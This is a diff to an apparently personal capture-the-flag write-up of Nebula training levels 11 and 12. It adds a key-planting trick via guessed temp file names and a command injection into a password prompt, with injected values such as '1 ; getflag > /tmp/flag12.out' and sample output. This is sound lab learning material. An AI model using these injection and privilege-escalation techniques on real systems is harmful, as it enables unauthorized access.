@@ -149,7 +149,8 @@ dummy
 ## 11
 Two approaches here, but neither are 100%, although I think they're part of the way...
 
-1. Python to encrypt the cmd & provide it as input
+1 - Python to encrypt the cmd & provide it as input
+
 ```python
 string = "/bin/getflag\x00"
 key = 0
@@ -256,9 +257,19 @@ a/qVP7EGFfUZD3S+zfxbSUb3LO+eBmA3/iMbzvFdFhF1jVDtu4QFzmu77ZZ8JGlHLi4IfNLkp4BX lev
 is compiled via `gcc -o level11c level11c.c` then run via `./level11c | ../flag11/flag11`.  
 It sets up a couple of links to the authkeys file, by guessing the pid to be the next sequential one, then trying the file name generation with the current second and the next second as starter values.  The flag program writes to one of them (hopefully) which means that the attacker can then access the account using the private key they earlier generated: `ssh -i /tmp/level11.key flag11@127.0.0.1`
 
-## nn
+## 12
+While this presents as a SHA1 hashpass, it's actually a command injection task, 
+and just passing the correct string and a  command to echo a newline will be enough 
+to pass the check, i.e.
 ```console
-
+level12@nebula:/home/flag12$ nc 127.0.0.1 50001
+Password: 4754a4f4bd5787accd33de887b9250a0691dd198 ; echo
+Congrats, your token is 413**CARRIER LOST**
+```
+Alternatively, you can pass something like `1 ; getflag > /tmp/flag12.out` to the password prompt, then 
+```console
+level12@nebula:/home/flag12$ cat /tmp/flag12.out
+You have successfully executed getflag on a target account
 ```
 
 ## nn
